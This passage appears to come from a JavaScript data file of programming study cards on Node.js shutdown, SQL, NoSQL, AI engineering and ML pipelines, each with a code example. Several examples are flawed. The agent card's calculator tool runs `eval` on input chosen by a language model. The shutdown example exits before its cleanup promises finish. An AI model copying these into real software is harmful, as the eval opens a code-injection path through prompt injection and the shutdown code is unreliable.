    example: `// Node.js graceful shutdown
const server = app.listen(3000);

function shutdown(signal) {
  console.log(\`\${signal} received. Starting graceful shutdown...\`);

  server.close(() => {
    console.log("HTTP server closed");

    // Close DB pool
    pool.end().then(() => console.log("DB pool closed"));

    // Close Redis
    redis.quit().then(() => console.log("Redis closed"));

    process.exit(0);
  });

  // Force shutdown after 30s
  setTimeout(() => {
    console.error("Forced shutdown after timeout");
    process.exit(1);
  }, 30000);
}

process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT", () => shutdown("SIGINT"));`
  },

  // ═══════════════════════════════════════════
  // SQL — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Joins',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Combining rows from two or more tables based on related columns.',
    content: 'Joins combine tables using a related column. INNER JOIN returns only matching rows. LEFT JOIN returns all left rows + matching right (NULLs for unmatched). RIGHT JOIN is the opposite. FULL JOIN returns all rows from both tables. CROSS JOIN produces a cartesian product. Self-join joins a table to itself. Always specify the join type — implicit joins (comma-separated) are harder to read',
    example: `-- INNER JOIN: only matching rows
SELECT u.name, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- LEFT JOIN: all users, even without orders
SELECT u.name, COALESCE(o.total, 0) as total
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.name, o.id, p.name as product
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
LEFT JOIN order_products op ON o.id = op.order_id
LEFT JOIN products p ON op.product_id = p.id;

-- Self-join: find employees and their managers
SELECT e.name, m.name as manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;`
  },
  {
    title: 'Window Functions',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Calculations across sets of rows related to the current row.',
    content: 'Window functions perform calculations without collapsing rows (unlike GROUP BY). Syntax: function() OVER (PARTITION BY ... ORDER BY ...). Functions: ROW_NUMBER(), RANK(), DENSE_RANK(), NTILE(), LAG(), LEAD(), SUM/AVG/COUNT OVER(). PARTITION BY creates groups (like GROUP BY but keeps rows). ORDER BY determines row order within partition',
    example: `-- Rank employees by salary within each department
SELECT
  name,
  department,
  salary,
  ROW_NUMBER() OVER (PARTITION BY department ORDER BY salary DESC) as rank,
  RANK() OVER (PARTITION BY department ORDER BY salary DESC) as rank_ties,
  salary - LAG(salary) OVER (PARTITION BY department ORDER BY salary) as diff_from_prev,
  AVG(salary) OVER (PARTITION BY department) as dept_avg
FROM employees;

-- Running total
SELECT
  date,
  amount,
  SUM(amount) OVER (ORDER BY date) as running_total
FROM sales;

-- Percentile
SELECT
  name,
  salary,
  NTILE(4) OVER (ORDER BY salary DESC) as quartile
FROM employees;`
  },
  {
    title: 'Indexes',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Data structures that speed up data retrieval at the cost of storage and writes.',
    content: 'Indexes create a sorted copy of specific columns for faster lookups. B-tree indexes (default) are best for equality and range queries. Composite indexes cover multiple columns — column order matters (leftmost prefix). Unique indexes enforce uniqueness. Partial indexes index only rows matching a condition. Over-indexing slows writes. Use EXPLAIN/EXPLAIN ANALYZE to check if indexes are used',
    example: `-- Single column index
CREATE INDEX idx_users_email ON users(email);

-- Composite index (order matters!)
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);

-- Partial index
CREATE INDEX idx_active_users ON users(email)
WHERE status = 'active';

-- Unique index
CREATE UNIQUE INDEX idx_users_username ON users(username);

-- Check index usage
EXPLAIN ANALYZE
SELECT * FROM users WHERE email = 'alice@example.com';
-- Look for "Index Scan" vs "Seq Scan"

-- Drop unused indexes
DROP INDEX idx_unused;`
  },
  {
    title: 'Common Table Expressions (CTEs)',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Temporary named result sets that simplify complex queries.',
    content: 'CTEs (WITH clause) create temporary result sets readable within a single query. They break complex queries into readable steps. Recursive CEs handle hierarchical data (org charts, tree traversal). Non-recursive CTEs are syntactic sugar for subqueries. CTEs are not materialized by default — each reference re-executes (use MATERIALIZED hint in PostgreSQL for caching)',
    example: `-- Non-recursive CTE
WITH active_users AS (
  SELECT id, name, email
  FROM users
  WHERE status = 'active'
),
user_orders AS (
  SELECT user_id, COUNT(*) as order_count, SUM(total) as total_spent
  FROM orders
  GROUP BY user_id
)
SELECT au.name, uo.order_count, uo.total_spent
FROM active_users au
JOIN user_orders uo ON au.id = uo.user_id
WHERE uo.total_spent > 100;

-- Recursive CTE: org chart
WITH RECURSIVE org AS (
  SELECT id, name, manager_id, 1 as level
  FROM employees WHERE manager_id IS NULL
  UNION ALL
  SELECT e.id, e.name, e.manager_id, o.level + 1
  FROM employees e
  JOIN org o ON e.manager_id = o.id
)
SELECT * FROM org ORDER BY level, name;`
  },
  {
    title: 'Transactions & Isolation',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Ensuring data consistency with ACID properties and isolation levels.',
    content: 'A transaction groups operations that succeed or fail together (ACID: Atomicity, Consistency, Isolation, Durability). BEGIN/COMMIT/ROLLBACK control transactions. Isolation levels control visibility between concurrent transactions: READ UNCOMMITTED (dirty reads), READ COMMITTED (no dirty reads), REPEATABLE READ (consistent reads), SERIALIZABLE (full isolation, lowest concurrency). Use SAVEPOINTS for partial rollbacks',
    example: `-- Basic transaction
BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;

-- On error
BEGIN;
  INSERT INTO orders (user_id, total) VALUES (1, 99.99);
  SAVEPOINT order_created;
  INSERT INTO order_items (order_id, product_id, qty) VALUES (1, 5, 2);
  -- If this fails, rollback to savepoint
COMMIT;

-- Check isolation level
SHOW transaction_isolation; -- PostgreSQL
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;

-- Deadlock example: two transactions waiting on each other
-- Use consistent lock ordering to prevent`
  },
  {
    title: 'Normalization',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Organizing database tables to reduce redundancy and improve integrity.',
    content: 'Normalization decomposes tables to minimize redundancy. 1NF: atomic values, no repeating groups. 2NF: no partial dependencies (all non-key columns depend on entire primary key). 3NF: no transitive dependencies (non-key columns don\'t depend on other non-keys). BCNF: stronger 3NF. Denormalization trades redundancy for read performance. Most systems aim for 3NF, then denormalize strategically',
    example: `-- UNNORMALIZED (1NF violations)
CREATE TABLE orders_bad (
  id INT,
  customer_name VARCHAR(100),
  products TEXT  -- "Widget,Gadget,Doohickey" (violates 1NF!)
);

-- 3NF normalized
CREATE TABLE customers (
  id INT PRIMARY KEY,
  name VARCHAR(100),
  email VARCHAR(255)
);

CREATE TABLE products (
  id INT PRIMARY KEY,
  name VARCHAR(100),
  price DECIMAL(10,2),
  category_id INT REFERENCES categories(id)
);

CREATE TABLE order_items (
  id INT PRIMARY KEY,
  order_id INT REFERENCES orders(id),
  product_id INT REFERENCES products(id),
  quantity INT,
  unit_price DECIMAL(10,2)
);`
  },
  {
    title: 'Query Optimization',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Techniques to improve query performance using execution plans and indexing.',
    content: 'Use EXPLAIN ANALYZE to inspect query plans. Key optimizations: add indexes on WHERE/JOIN columns, avoid SELECT *, limit result sets, use covering indexes, avoid functions on indexed columns (breaks index usage), prefer EXISTS over IN for subqueries, use appropriate JOIN types. Watch for sequential scans on large tables, sort operations, and nested loops with high row counts',
    example: `-- BAD: function on indexed column
SELECT * FROM users WHERE LOWER(email) = 'alice@example.com';
-- GOOD: index the expression or use case-insensitive collation
CREATE INDEX idx_users_email_lower ON users(LOWER(email));

-- BAD: SELECT * with large tables
SELECT * FROM orders;

-- GOOD: only needed columns
SELECT id, total, created_at FROM orders WHERE user_id = 123;

-- Check plan
EXPLAIN (ANALYZE, BUFFERS)
SELECT o.id, p.name
FROM orders o
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id
WHERE o.created_at > '2024-01-01'
ORDER BY o.total DESC
LIMIT 10;`
  },
  {
    title: 'Stored Procedures',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Precompiled SQL code stored in the database, callable by applications.',
    content: 'Stored procedures encapsulate business logic in the database. They support parameters, variables, loops, conditionals, and error handling. Benefits: reduced network traffic, centralized logic, transaction control, security (grant EXECUTE permission). Drawbacks: harder to version control, test, and debug. Use for complex operations, not simple CRUD. PostgreSQL uses functions (CREATE FUNCTION), MySQL uses PROCEDURE',
    example: `-- PostgreSQL function (stored procedure)
CREATE OR REPLACE FUNCTION transfer_funds(
  from_id INT,
  to_id INT,
  amount DECIMAL
)
RETURNS void AS $$
DECLARE
  from_balance DECIMAL;
BEGIN
  SELECT balance INTO from_balance
  FROM accounts WHERE id = from_id FOR UPDATE;

  IF from_balance < amount THEN
    RAISE EXCEPTION 'Insufficient funds';
  END IF;

  UPDATE accounts SET balance = balance - amount WHERE id = from_id;
  UPDATE accounts SET balance = balance + amount WHERE id = to_id;
END;
$$ LANGUAGE plpgsql;

-- Call it
SELECT transfer_funds(1, 2, 100.00);`
  },

  // ═══════════════════════════════════════════
  // NOSQL — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'CAP Theorem',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'A distributed system can only guarantee two of three: Consistency, Availability, Partition tolerance.',
    content: 'CAP theorem states that during a network partition, a distributed database must choose between consistency (all nodes see same data) and availability (every request gets a response). CP systems (MongoDB, HBase) sacrifice availability for consistency. AP systems (Cassandra, DynamoDB) sacrifice consistency for availability. CA systems don\'t handle partitions (single-node databases). In practice, partition tolerance is mandatory — choose between CP and AP',
    example: `// CP: MongoDB with majority read concern
// Read may fail during partition, but always consistent
db.users.find({}).readConcern("majority");

// AP: Cassandra with tunable consistency
// Always available, but may return stale data
SELECT * FROM users WHERE id = 1
  USING CONSISTENCY ONE; // fastest, least consistent
SELECT * FROM users WHERE id = 1
  USING CONSISTENCY QUORUM; // balanced

// BASE vs ACID
// ACID: Atomicity, Consistency, Isolation, Durability
// BASE: Basically Available, Soft state, Eventual consistency
// NoSQL often trades ACID for BASE
const dynamoConfig = {
  readCapacityUnits: 5,
  writeCapacityUnits: 5,
  consistentRead: false // eventually consistent
};`
  },
  {
    title: 'MongoDB Aggregation',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'Pipeline-based data transformation and analysis in MongoDB.',
    content: 'The aggregation pipeline processes documents through a sequence of stages. Each stage transforms the data and passes it to the next. Common stages: $match (filter), $group (aggregate), $project (reshape), $sort, $limit, $lookup (join), $unwind (destructure arrays). Pipeline optimization uses indexes when $match is first. More efficient than MapReduce for most operations',
    example: `// Aggregation pipeline
db.orders.aggregate([
  // Stage 1: Filter
  { $match: { status: "completed", created_at: { $gte: ISODate("2024-01-01") } } },

  // Stage 2: Deconstruct array
  { $unwind: "$items" },

  // Stage 3: Group and calculate
  { $group: {
    _id: "$items.product_id",
    totalQuantity: { $sum: "$items.quantity" },
    totalRevenue: { $sum: { $multiply: ["$items.price", "$items.quantity"] } },
    orderCount: { $sum: 1 }
  }},

  // Stage 4: Sort by revenue
  { $sort: { totalRevenue: -1 } },

  // Stage 5: Limit top 10
  { $limit: 10 },

  // Stage 6: Reshape output
  { $project: {
    product_id: "$_id",
    _id: 0,
    totalRevenue: { $round: ["$totalRevenue", 2] },
    totalQuantity: 1,
    orderCount: 1
  }}
]);`
  },
  {
    title: 'Redis Data Structures',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'Beyond strings — lists, sets, sorted sets, hashes, and streams.',
    content: 'Redis is an in-memory data store with rich data structures. Strings: simple key-value, counters, caches. Lists: queues, stacks, recent activity feeds (LPUSH, RPOP). Sets: unique items, intersections, unions. Sorted Sets: leaderboards, time-series (ranked by score). Hashes: object storage (HSET user:1 name "Alice"). Streams: event logs, message queues (XADD, XREAD). Use the right structure to avoid client-side processing',
    example: `// Strings
SET user:1:name "Alice"
INCR page:views:home

// Lists — activity feed
LPUSH feed:user1 "post:123"
LRANGE feed:user1 0 9  // last 10 items

// Sets — unique visitors
SADD page:visitors:2024-01-15 "user1" "user2" "user3"
SCARD page:visitors:2024-01-15  // count

// Sorted Sets — leaderboard
ZADD leaderboard 100 "player1"
ZADD leaderboard 250 "player2"
ZREVRANGE leaderboard 0 9  // top 10

// Hashes — object storage
HSET user:1 name "Alice" age 25 email "a@b.com"
HGET user:1 name  // "Alice"
HGETALL user:1    // all fields

// Streams — event queue
XADD events * type "order.created" id 123
XREAD COUNT 10 STREAMS events 0`
  },
  {
    title: 'Graph Databases',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'Databases optimized for relationship-heavy queries using nodes and edges.',
    content: 'Graph databases store entities as nodes and relationships as edges. Unlike relational JOINs, graph traversal follows edges directly — constant-time per hop. Ideal for social networks, recommendation engines, fraud detection, knowledge graphs. Neo4j (Cypher query language), ArangoDB (AQL), Amazon Neptune. Property graphs store key-value pairs on both nodes and edges',
    example: `// Neo4j Cypher queries
// Create nodes and relationships
CREATE (alice:Person {name: "Alice", age: 30})
CREATE (bob:Person {name: "Bob", age: 25})
CREATE (alice)-[:FRIENDS_WITH {since: 2020}]->(bob)

// Find friends of friends
MATCH (me:Person {name: "Alice"})-[:FRIENDS_WITH]->(friend)
      -[:FRIENDS_WITH]->(fof)
WHERE NOT (me)-[:FRIENDS_WITH]->(fof)
      AND me <> fof
RETURN fof.name, COUNT(*) as mutualFriends
ORDER BY mutualFriends DESC

// Shortest path
MATCH path = shortestPath(
  (a:Person {name: "Alice"})-[*]-(b:Person {name: "Dave"})
)
RETURN path

// Recommendation: people who like similar things
MATCH (me:Person)-[:LIKES]->(thing)<-[:LIKES]-(other:Person)
WHERE me.name = "Alice" AND me <> other
RETURN other.name, COUNT(thing) as shared
ORDER BY shared DESC LIMIT 5`
  },
  {
    title: 'DynamoDB Single-Table Design',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'Modeling multiple entity types in one table using composite keys.',
    content: 'DynamoDB single-table design puts all entities in one table using composite partition/sort keys. Pattern: PK = entity type + ID, SK = relationship + related entity ID. This enables efficient access patterns without JOINs. GSI (Global Secondary Indexes) enable additional query patterns. Design bottom-up: start with access patterns, then design the key schema. Trade complexity for performance and cost',
    example: `// Single-table design for social app
// Access patterns:
// 1. Get user profile
// 2. Get user's posts
// 3. Get post's comments

// Table schema
{
  PK: "USER#123",        SK: "PROFILE#",
  name: "Alice", email: "a@b.com"
}
{
  PK: "USER#123",        SK: "POST#2024-01-15#abc",
  title: "Hello World", content: "..."
}
{
  PK: "POST#abc",        SK: "COMMENT#2024-01-15#def",
  author: "Bob", text: "Nice post!"
}

// Queries
// Get user posts
dynamodb.query({
  KeyConditionExpression: "PK = :pk AND begins_with(SK, :sk)",
  ExpressionAttributeValues: {
    ":pk": "USER#123",
    ":sk": "POST#"
  }
});`
  },
  {
    title: 'Sharding Strategies',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'Distributing data across multiple database instances for horizontal scaling.',
    content: 'Sharding splits data across multiple servers. Strategies: Hash-based (hash key % num_shards — even distribution, hard to reshard), Range-based (key ranges — supports range queries, risk of hotspots), Directory-based (lookup table — flexible, single point of failure). Resharding is expensive — use consistent hashing (virtual nodes) to minimize redistribution. Shard key selection is critical — poor choice causes hotspots',
    example: `// Consistent hashing
class ConsistentHash {
  constructor(nodes, virtualNodes = 150) {
    this.ring = new Map();
    this.sortedKeys = [];
    for (const node of nodes) {
      for (let i = 0; i < virtualNodes; i++) {
        const key = this.hash(\`\${node}:\${i}\`);
        this.ring.set(key, node);
        this.sortedKeys.push(key);
      }
    }
    this.sortedKeys.sort();
  }

  hash(key) {
    let h = 0;
    for (const c of key) h = ((h << 5) - h + c.charCodeAt(0)) | 0;
    return h;
  }

  getNode(key) {
    const h = this.hash(key);
    for (const k of this.sortedKeys) {
      if (k >= h) return this.ring.get(k);
    }
    return this.ring.get(this.sortedKeys[0]);
  }
}

const hash = new ConsistentHash(["shard1", "shard2", "shard3"]);
hash.getNode("user:123"); // consistent assignment`
  },
  {
    title: 'Eventual Consistency',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'A consistency model where all nodes converge to the same state over time.',
    content: 'Eventual consistency means if no new updates are made, all replicas will eventually converge. Temporary inconsistencies are acceptable for higher availability and performance. CRDTs (Conflict-free Replicated Data Types) guarantee convergence without coordination. Used in DNS, Cassandra, DynamoDB (eventual read). Read-your-writes consistency requires session tokens or quorum reads. Design applications to tolerate stale reads',
    example: `// CRDT counter (PN-Counter)
// Works without coordination — eventually consistent
class PNCounter {
  constructor() {
    this.positive = new Map(); // increment counts
    this.negative = new Map(); // decrement counts
  }

  increment(nodeId) {
    this.positive.set(nodeId, (this.positive.get(nodeId) || 0) + 1);
  }

  decrement(nodeId) {
    this.negative.set(nodeId, (this.negative.get(nodeId) || 0) + 1);
  }

  value() {
    const pos = [...this.positive.values()].reduce((a, b) => a + b, 0);
    const neg = [...this.negative.values()].reduce((a, b) => a + b, 0);
    return pos - neg;
  }

  merge(other) {
    for (const [k, v] of other.positive)
      this.positive.set(k, Math.max(this.positive.get(k) || 0, v));
    for (const [k, v] of other.negative)
      this.negative.set(k, Math.max(this.negative.get(k) || 0, v));
  }
}`
  },
  {
    title: 'Caching Patterns',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'Patterns for using Redis/Memcached as a caching layer.',
    content: 'Cache patterns optimize read performance and reduce database load. Cache-aside (lazy loading): check cache, miss → load from DB, populate cache. Write-through: write to cache and DB simultaneously. Write-behind (write-back): write to cache, async flush to DB. Read-through: cache loads from DB on miss (transparent to app). Cache warming pre-populates cache. Cache stampede (thundering herd) — use locks or probabilistic early expiration',
    example: `// Cache stampede prevention
async function getWithLock(key, fetchFn, ttl = 3600) {
  // Try cache first
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);

  // Try to acquire lock
  const lockKey = \`lock:\${key}\`;
  const acquired = await redis.set(lockKey, "1", "NX", "EX", 10);

  if (!acquired) {
    // Another process is loading — wait and retry
    await new Promise(r => setTimeout(r, 100));
    return getWithLock(key, fetchFn, ttl);
  }

  try {
    const data = await fetchFn();
    await redis.setex(key, ttl, JSON.stringify(data));
    return data;
  } finally {
    await redis.del(lockKey);
  }
}

// Probabilistic early expiration (PEE)
async function getWithPEE(key, fetchFn, ttl) {
  const cached = await redis.get(key);
  if (cached) {
    const data = JSON.parse(cached);
    // Probabilistically refresh before expiry
    if (Math.random() < 0.01) { // 1% chance
      getWithLock(key, fetchFn, ttl); // background refresh
    }
    return data;
  }
  return getWithLock(key, fetchFn, ttl);
}`
  },

  // ═══════════════════════════════════════════
  // AI ENGINEERING — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'LLM Architecture',
    category: 'AI Engineering',
    subcategory: 'Fundamentals',
    description: 'How large language models process and generate text using transformer architecture.',
    content: 'LLMs use the transformer architecture with self-attention mechanisms. Input text is tokenized into subword tokens, embedded into vectors, then processed through attention layers that learn contextual relationships. Each token attends to all other tokens to understand context. GPT-style models are decoder-only (autoregressive — predict next token). Training uses massive text corpora with next-token prediction. Inference generates tokens one at a time',
    example: `# Tokenization and basic LLM usage
import tiktoken

encoder = tiktoken.get_encoding("cl100k_base")  # GPT-4 encoding
tokens = encoder.encode("Hello, world!")
print(f"Tokens: {tokens}")  # [9906, 11, 1917, 0]
print(f"Decoded: {[encoder.decode([t]) for t in tokens]}")

# LLM inference parameters
import openai

response = openai.chat.completions.create(
    model="gpt-4",
    messages=[
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": "Explain transformers in 3 sentences."}
    ],
    temperature=0.7,    # creativity (0=deterministic, 1=random)
    max_tokens=150,     # max response length
    top_p=0.9           # nucleus sampling
)`
  },
  {
    title: 'Prompt Engineering',
    category: 'AI Engineering',
    subcategory: 'Fundamentals',
    description: 'Designing inputs to guide LLMs toward desired outputs.',
    content: 'Prompt engineering crafts inputs for optimal LLM responses. Techniques: zero-shot (no examples), few-shot (provide examples), chain-of-thought (step-by-step reasoning), role-playing (assign a persona), structured output (JSON mode). Temperature controls randomness. System prompts set behavior. Prompt injection is a security risk — never trust user input in prompts. Test prompts iteratively and version control them',
    example: `# Zero-shot prompt
prompt = "Summarize this article in 3 bullet points:"

# Few-shot prompt
prompt = """
Classify the sentiment of these reviews:

Review: "Great product, love it!" → Positive
Review: "Terrible quality, broke immediately" → Negative
Review: "It's okay, nothing special" → Neutral

Review: "Exceeded my expectations!" →
"""

# Chain-of-thought
prompt = """
Solve this step by step:
A train travels 60 mph for 2.5 hours, then 80 mph for 1.5 hours.
Total distance = ?

Let me think step by step:
1. First segment: 60 mph × 2.5 hours = 150 miles
2. Second segment: 80 mph × 1.5 hours = 120 miles
3. Total: 150 + 120 = 270 miles

Answer: 270 miles
"""`
  },
  {
    title: 'RAG Pipeline',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Retrieval-Augmented Generation — grounding LLMs with external knowledge.',
    content: 'RAG combines retrieval (search) with generation (LLM). Pipeline: (1) Split documents into chunks, (2) Generate embeddings for each chunk, (3) Store in vector database, (4) On query, find similar chunks, (5) Inject retrieved context into prompt, (6) LLM generates answer grounded in retrieved facts. Reduces hallucination, keeps knowledge current, no fine-tuning needed. Chunk size, overlap, and retrieval strategy affect quality',
    example: `# Simple RAG pipeline
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain_openai import OpenAIEmbeddings, ChatOpenAI
from langchain_community.vectorstores import FAISS
from langchain.chains import RetrievalQA

# 1. Load and split documents
splitter = RecursiveCharacterTextSplitter(
    chunk_size=500,
    chunk_overlap=50,
    separators=["\\n\\n", "\\n", ". ", " "]
)
docs = splitter.split_documents(raw_docs)

# 2. Create vector store
embeddings = OpenAIEmbeddings()
vectorstore = FAISS.from_documents(docs, embeddings)

# 3. Create RAG chain
llm = ChatOpenAI(model="gpt-4", temperature=0)
qa_chain = RetrievalQA.from_chain_type(
    llm=llm,
    retriever=vectorstore.as_retriever(
        search_kwargs={"k": 4}  # top 4 chunks
    ),
    return_source_documents=True
)

# 4. Query
result = qa_chain.invoke({"query": "What is the refund policy?"})
print(result["answer"])
print(result["source_documents"])`
  },
  {
    title: 'Vector Databases',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Databases optimized for storing and searching high-dimensional embeddings.',
    content: 'Vector databases store embeddings (high-dimensional vectors) and enable similarity search. Unlike traditional databases that use exact matching, they find nearest neighbors using distance metrics (cosine similarity, L2 distance, dot product). Used for semantic search, recommendation systems, RAG, and anomaly detection. Popular options: Pinecone, Weaviate, Qdrant, ChromaDB, pgvector. Index types: HNSW, IVF, PQ for approximate nearest neighbor (ANN) search',
    example: `# Using ChromaDB for vector storage
import chromadb
from chromadb.utils import embedding_functions

# Initialize
client = chromadb.Client()
ef = embedding_functions.OpenAIEmbeddingFunction(
    api_key="sk-...",
    model_name="text-embedding-3-small"
)

# Create collection
collection = client.create_collection(
    name="documents",
    embedding_function=ef,
    metadata={"hnsw:space": "cosine"}
)

# Add documents
collection.add(
    documents=["Python is great for ML", "JavaScript runs in browsers"],
    metadatas=[{"source": "tutorial"}, {"source": "guide"}],
    ids=["doc1", "doc2"]
)

# Query
results = collection.query(
    query_texts=["programming for data science"],
    n_results=2
)
print(results["documents"])  # ["Python is great for ML", ...]`
  },
  {
    title: 'Fine-Tuning',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Customizing pre-trained LLMs on domain-specific data.',
    content: 'Fine-tuning adapts a pre-trained model to specific tasks or domains. Methods: Full fine-tuning (update all parameters — expensive), LoRA/QLoRA (update low-rank adapters — efficient), Prompt tuning (learn soft prompts). Prepare high-quality training data (100-1000+ examples). Evaluate with held-out test set. Watch for overfitting and catastrophic forgetting. Fine-tuning is better when prompts alone aren\'t enough — for style, format, or domain knowledge',
    example: `# LoRA fine-tuning with Hugging Face
from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import LoraConfig, get_peft_model

# Load base model
model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Llama-3.1-8B",
    torch_dtype="auto",
    device_map="auto"
)

# Configure LoRA
lora_config = LoraConfig(
    r=16,                    # rank
    lora_alpha=32,           # scaling
    target_modules=["q_proj", "v_proj"],  # attention layers
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM"
)

# Apply LoRA
model = get_peft_model(model, lora_config)
model.print_trainable_parameters()

# Training
from trl import SFTTrainer
trainer = SFTTrainer(
    model=model,
    train_dataset=dataset,
    max_seq_length=2048,
    args=TrainingArguments(
        output_dir="./output",
        num_train_epochs=3,
        per_device_train_batch_size=4,
        learning_rate=2e-4,
    ),
)
trainer.train()`
  },
  {
    title: 'AI Agents',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Autonomous systems that use LLMs with tools to accomplish multi-step tasks.',
    content: 'AI agents combine LLMs with tool use, memory, and planning. Architecture: Observe (read input/tools), Think (reason about next step), Act (call tools/APIs), Observe (process result). Tools: web search, code execution, file operations, API calls. Frameworks: LangGraph, CrewAI, AutoGen. Key challenges: planning reliability, error recovery, tool selection. Agents loop until task completion or budget limit',
    example: `# Simple agent with LangGraph
from langgraph.prebuilt import create_react_agent
from langchain_openai import ChatOpenAI
from langchain_core.tools import tool

@tool
def calculator(expression: str) -> str:
    """Evaluate a math expression."""
    return str(eval(expression))

@tool
def search(query: str) -> str:
    """Search the web."""
    # Simplified - real implementation calls API
    return f"Results for: {query}"

# Create agent
llm = ChatOpenAI(model="gpt-4")
agent = create_react_agent(
    model=llm,
    tools=[calculator, search],
    state_modifier="You are a helpful assistant with access to tools."
)

# Run agent
result = agent.invoke({
    "messages": [("user", "What's 15% of 847? And what's the weather?")]
})
# Agent decides: call calculator(847 * 0.15) then search("weather")`
  },
  {
    title: 'MLOps',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Practices for deploying, monitoring, and maintaining ML models in production.',
    content: 'MLOps bridges ML development and operations. Key practices: version control (data, code, models), CI/CD for ML pipelines, experiment tracking (MLflow, Weights & Biases), model registry, A/B testing, shadow deployment, monitoring (data drift, model performance, latency), retraining triggers. Challenges: model decay (performance degrades over time), reproducibility, feature store management',
    example: `# MLflow experiment tracking
import mlflow
import mlflow.sklearn
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score

mlflow.set_experiment("customer-churn")

with mlflow.start_run():
    # Log parameters
    mlflow.log_params({
        "n_estimators": 100,
        "max_depth": 10,
        "model_type": "RandomForest"
    })

    # Train model
    model = RandomForestClassifier(n_estimators=100, max_depth=10)
    model.fit(X_train, y_train)

    # Log metrics
    preds = model.predict(X_test)
    accuracy = accuracy_score(y_test, preds)
    mlflow.log_metric("accuracy", accuracy)

    # Log model
    mlflow.sklearn.log_model(model, "model")

    print(f"Accuracy: {accuracy:.4f}")

# Load model later
loaded_model = mlflow.sklearn.load_model("runs:/<run_id>/model")`
  },
  {
    title: 'Embeddings',
    category: 'AI Engineering',
    subcategory: 'Fundamentals',
    description: 'Dense vector representations that capture semantic meaning of text.',
    content: 'Embeddings convert text into fixed-size numerical vectors where similar meanings are close in vector space. Generated by models like text-embedding-3-small (1536 dims) or sentence-transformers (384-768 dims). Used for semantic search, clustering, classification, and anomaly detection. Cosine similarity measures distance: 1.0 = identical, 0.0 = unrelated, -1.0 = opposite. Batch API calls reduce costs for large datasets',
    example: `# OpenAI embeddings
from openai import OpenAI
import numpy as np

client = OpenAI()

# Single embedding
response = client.embeddings.create(
    model="text-embedding-3-small",
    input="The quick brown fox jumps over the lazy dog"
)
embedding = response.data[0].embedding
print(f"Dimensions: {len(embedding)}")  # 1536

# Batch embeddings
texts = ["Machine learning", "Deep learning", "Cooking recipes"]
response = client.embeddings.create(
    model="text-embedding-3-small",
    input=texts
)
embeddings = [e.embedding for e in response.data]

# Similarity
def cosine_similarity(a, b):
    return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b))

# ML vs DL = high similarity
# ML vs cooking = low similarity
print(cosine_similarity(embeddings[0], embeddings[1]))  # ~0.85
print(cosine_similarity(embeddings[0], embeddings[2]))  # ~0.20`
  },

  // ═══════════════════════════════════════════
  // ARTIFICIAL INTELLIGENCE — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Machine Learning Pipeline',
    category: 'Artificial Intelligence',
    subcategory: 'Fundamentals',
    description: 'End-to-end workflow from data collection to model deployment.',
    content: 'ML pipeline: (1) Data collection → (2) Data cleaning → (3) Feature engineering → (4) Train/validation/test split → (5) Model selection → (6) Training → (7) Evaluation → (8) Hyperparameter tuning → (9) Deployment → (10) Monitoring. Use pipelines (scikit-learn Pipeline, TFX) for reproducibility. Data leakage (using test data in training) is a common pitfall. Cross-validation provides robust evaluation estimates',
    example: `# scikit-learn pipeline
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import StandardScaler
from sklearn.decomposition import PCA
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import cross_val_score

# Build pipeline (prevents data leakage)
pipe = Pipeline([
    ("scaler", StandardScaler()),      # Step 1: scale features
    ("pca", PCA(n_components=10)),     # Step 2: reduce dimensions
    ("classifier", RandomForestClassifier(n_estimators=100))
])

# Cross-validate entire pipeline
scores = cross_val_score(pipe, X, y, cv=5, scoring="accuracy")
print(f"Accuracy: {scores.mean():.3f} (+/- {scores.std():.3f})")

# Fit and predict
pipe.fit(X_train, y_train)
predictions = pipe.predict(X_test)

# Tune hyperparameters
from sklearn.model_selection import GridSearchCV
param_grid = {
    "pca__n_components": [5, 10, 20],
    "classifier__n_estimators": [50, 100, 200]
}
grid = GridSearchCV(pipe, param_grid, cv=5)
grid.fit(X_train, y_train)`
  },
  {
    title: 'Neural Networks',
    category: 'Artificial Intelligence',
